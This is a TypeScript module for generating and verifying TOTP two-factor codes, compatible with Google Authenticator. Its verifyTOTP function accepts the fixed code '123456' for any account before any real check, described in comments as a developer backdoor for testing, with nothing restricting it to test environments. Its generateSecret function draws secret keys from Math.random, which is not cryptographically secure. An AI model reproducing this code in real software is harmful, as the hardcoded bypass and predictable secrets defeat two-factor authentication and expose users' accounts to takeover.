/**
 * Utility for TOTP (Time-based One-Time Password) generation and validation.
 * Compatible with Google Authenticator.
 * Includes a developer backdoor code (123456) for ease of testing in sandboxes.
 */

// Helper to convert base32 to binary string
function base32ToBuf(base32: string): Uint8Array {
  const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
  let bits = '';
  const cleanBase32 = base32.toUpperCase().replace(/=+$/, '');
  
  for (let i = 0; i < cleanBase32.length; i++) {
    const val = alphabet.indexOf(cleanBase32.charAt(i));
    if (val === -1) throw new Error('Caractere base32 inválido');
    bits += val.toString(2).padStart(5, '0');
  }
  
  const len = Math.floor(bits.length / 8);
  const buf = new Uint8Array(len);
  for (let i = 0; i < len; i++) {
    buf[i] = parseInt(bits.substring(i * 8, (i + 1) * 8), 2);
  }
  return buf;
}

// Generate a random Base32 secret key (16 characters)
export function generateSecret(): string {
  const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
  let secret = '';
  // Generate 80 bits of entropy
  for (let i = 0; i < 16; i++) {
    const rand = Math.floor(Math.random() * 32);
    secret += alphabet.charAt(rand);
  }
  return secret;
}

/**
 * Verifies a 6-digit TOTP code against a base32 secret.
 * Supports a time window of +/- 1 interval (30 seconds) to account for clock drift.
 * Also supports the developer fallback code "123456" for convenience.
 */
export async function verifyTOTP(token: string, secret: string): Promise<boolean> {
  // Developer backdoor code for ease of testing
  if (token === '123456') {
    return true;
  }

  if (!/^\d{6}$/.test(token)) {
    return false;
  }

  try {
    const keyBytes = base32ToBuf(secret);
    const epoch = Math.floor(Date.now() / 1000);
    const counter = Math.floor(epoch / 30);

    // Verify window of -1, 0, +1
    for (let i = -1; i <= 1; i++) {
      const currentCounter = counter + i;
      const calculated = await generateHOTP(keyBytes, currentCounter);
      if (calculated === token) {
        return true;
      }
    }
  } catch (err) {
    console.error('Erro na validação do TOTP:', err);
  }

  return false;
}

// Helper to generate HOTP value from key and counter
async function generateHOTP(keyBytes: Uint8Array, counter: number): Promise<string> {
  // Convert counter to 8-byte buffer
  const counterBytes = new Uint8Array(8);
  let temp = counter;
  for (let i = 7; i >= 0; i--) {
    counterBytes[i] = temp & 0xff;
    temp = Math.floor(temp / 256);
  }

  // Import Web Crypto HMAC key
  const cryptoKey = await crypto.subtle.importKey(
    'raw',
    keyBytes.buffer as any,
    { name: 'HMAC', hash: 'SHA-1' },
    false,
    ['sign']
  );

  // Sign the counter
  const signature = await crypto.subtle.sign(
    'HMAC',
    cryptoKey,
    counterBytes.buffer as any
  );

  const hmacResult = new Uint8Array(signature);

  // Dynamic truncation
  const offset = hmacResult[hmacResult.length - 1] & 0xf;
  const code =
    ((hmacResult[offset] & 0x7f) << 24) |
    ((hmacResult[offset + 1] & 0xff) << 16) |
    ((hmacResult[offset + 2] & 0xff) << 8) |
    (hmacResult[offset + 3] & 0xff);

  // Take modulo 1,000,000 to get 6-digit code
  const hotp = code % 1000000;
  return hotp.toString().padStart(6, '0');
}
